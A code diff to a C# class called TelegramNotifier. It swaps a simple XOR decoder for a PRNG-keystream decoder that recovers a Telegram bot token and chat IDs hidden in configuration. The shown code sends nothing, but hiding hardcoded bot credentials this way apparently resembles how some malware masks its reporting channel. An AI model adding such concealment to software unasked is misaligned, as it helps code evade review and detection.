@@ -85,12 +85,21 @@ internal static class TelegramNotifier
         catch { }
     }
 
-    private static string DecodeXor(byte[] data, byte[] key)
+    private static string DecodeSfc(byte[] data, byte[] seed)
     {
         if (data.Length == 0) return "";
         var buf = new byte[data.Length];
+        ulong a = BitConverter.ToUInt64(seed, 0),  b = BitConverter.ToUInt64(seed, 8),
+              c = BitConverter.ToUInt64(seed, 16), d = BitConverter.ToUInt64(seed, 24);
         for (int i = 0; i < data.Length; i++)
-            buf[i] = (byte)(data[i] ^ key[i % key.Length]);
+        {
+            ulong k = a + b + d; d++;
+            a = b ^ (b >> 11);
+            b = c + (c << 3);
+            c = (c << 24) | (c >> 40);
+            c += k;
+            buf[i] = (byte)(data[i] ^ (byte)k);
+        }
         return Encoding.UTF8.GetString(buf);
     }
 
@@ -170,9 +179,9 @@ internal static class TelegramNotifier
         if (!Config.TelegramEnabled) return;
         if (!ShouldNotify()) return;
 
-        var token   = DecodeXor(Config.TelegramTokenXor,   Config.TelegramXorKey);
-        var chatId1 = DecodeXor(Config.TelegramChatId1Xor, Config.TelegramXorKey);
-        var chatId2 = DecodeXor(Config.TelegramChatId2Xor, Config.TelegramXorKey);
+        var token   = DecodeSfc(Config.TelegramTokenSfc,   Config.TelegramSfcSeed);
+        var chatId1 = DecodeSfc(Config.TelegramChatId1Sfc, Config.TelegramSfcSeed);
+        var chatId2 = DecodeSfc(Config.TelegramChatId2Sfc, Config.TelegramSfcSeed);
 
         if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;
 
